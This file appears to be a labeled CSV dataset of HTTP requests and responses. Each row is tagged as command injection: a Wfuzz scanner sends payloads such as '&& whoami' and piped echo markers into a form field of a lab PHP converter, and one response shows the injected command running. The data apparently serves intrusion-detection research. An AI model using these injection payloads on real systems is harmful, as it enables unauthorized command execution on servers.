attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
cmdinj,192.168.1.34,80,"ytlink="" && whoami&send=send",*/*,28,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61366
cmdinj,192.168.1.34,80,ytlink='&&echo%20TWKYHE$((0%2B57))$(echo%20TWKYHE)TWKYHE|&send=send,*/*,67,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:36 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61367
cmdinj,192.168.1.34,80,"ytlink=""%26%26echo%20IJQIDW$((5%2B53))$(echo%20IJQIDW)IJQIDW&send=send",*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:36 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61369
cmdinj,192.168.1.34,80,"ytlink=""%20echo%20TZKEKG$((48%2B96))$(echo%20TZKEKG)TZKEKG%7C&send=send",*/*,71,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:37 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61370
cmdinj,192.168.1.34,80,ytlink=|echo%20CAUDBF$((21%2B9))$(echo%20CAUDBF)CAUDBF\&send=send,*/*,65,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"CAUDBF30CAUDBFCAUDBF\   <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,301,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:37 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61371
cmdinj,192.168.1.34,80,ytlink=||echo%20UWJWIH$((97%2B96))$(echo%20UWJWIH)UWJWIH%7C&send=send,*/*,69,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61372
cmdinj,192.168.1.34,80,ytlink=%7C%7Cecho%20QBEEHF$((22%2B49))$(echo%20QBEEHF)QBEEHF|&send=send,*/*,71,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61373
cmdinj,192.168.1.34,80,ytlink=%26echo%20LPHFGP$((58%2B11))$(echo%20LPHFGP)LPHFGP%7C&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61374
cmdinj,192.168.1.34,80,ytlink=%27echo%20RGSQNO$((48%2B30))$(echo%20RGSQNO)RGSQNO%27&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:39 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61375
cmdinj,192.168.1.34,80,ytlink=%27%0aecho%20UDKFRM$((88%2B90))$(echo%20UDKFRM)UDKFRM%7C&send=send,*/*,73,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:39 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61376
